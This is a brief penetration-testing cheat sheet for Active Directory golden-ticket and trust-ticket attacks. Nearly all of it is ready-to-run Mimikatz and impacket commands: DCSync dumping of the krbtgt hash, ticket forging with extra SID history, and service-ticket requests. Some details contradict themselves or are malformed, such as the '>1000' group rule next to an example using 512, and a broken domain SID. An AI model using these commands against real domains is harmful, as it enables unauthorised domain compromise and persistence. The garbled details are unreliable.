**Pentest Notes: Golden Ticket and Trust Ticket with Extra SID History**

---

### Golden Ticket

1. **Get Domain SID:**

   ```powershell
   Get-DomainSID -Domain <domain>
   Get-DomainSID -Domain <target_domain>
   ```

2. **SID Filtering and Finding Groups with SID > 1000:**

   ```powershell
   Get-DomainGroupMember -Identity "<group>" -Domain <target_domain>
   ```

3. **Dump krbtgt Hash Using Mimikatz:**

   ```plaintext
   mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
   ```

4. **Create Golden Ticket with Mimikatz:**

   ```plaintext
   mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt
   ```

5. **Create Golden Ticket with Ticketer.py:**

   ```plaintext
   ticketer.py -nthash <krbtgt_hash> -domain-sid <from_sid> -domain <from_domain> -extra-sid <to_domain>-<group_id> goldenuser
   ```

   - *Note:* The group ID must be greater than 1000.

---

### Trust Ticket with Extra SID History

1. **Get the Trust Ticket in the NTDS (TARGET_DOMAIN$):**

   ```plaintext
   ticketer.py -nthash <trust_key> -domain-sid <from_domain_sid> -domain <from_domain> -extra-sid <to_domain>-<group_id> -spn krbtgt/<to_domain> trustuser
   ```

   - *Note:* The group ID must be greater than 1000.

2. **Get Service Ticket with getST.py:**

   ```plaintext
   getST.py -k -no-pass -spn cifs/<dc_fqdn> <parent_domain>/trustfakeuser@<parent_domain> -debug
   ```

3. **Using Extra SID History:**

   - When creating tickets, include additional SIDs in the `extra-sid` field to maintain access across domain migrations or to include SID history.

   ```plaintext
   ticketer.py -nthash <krbtgt_hash> -domain-sid <from_sid> -domain <from_domain> -extra-sid <to_domain>-<group_id>,<extra_sid1>,<extra_sid2> goldenuser
   ```

   - *Example:* If the target domain is `target.local` and the group ID is 512 with additional SIDs `S-1-5-21-1234567890-1234567890-1234567890-500`, it would look like this:

   ```plaintext
   ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21--9876543210 -domain target.local -extra-sid S-1-5-21-98763210-512,S-1-5-21-1234567890-1234567890-1234567890-500 goldenuser
   ```
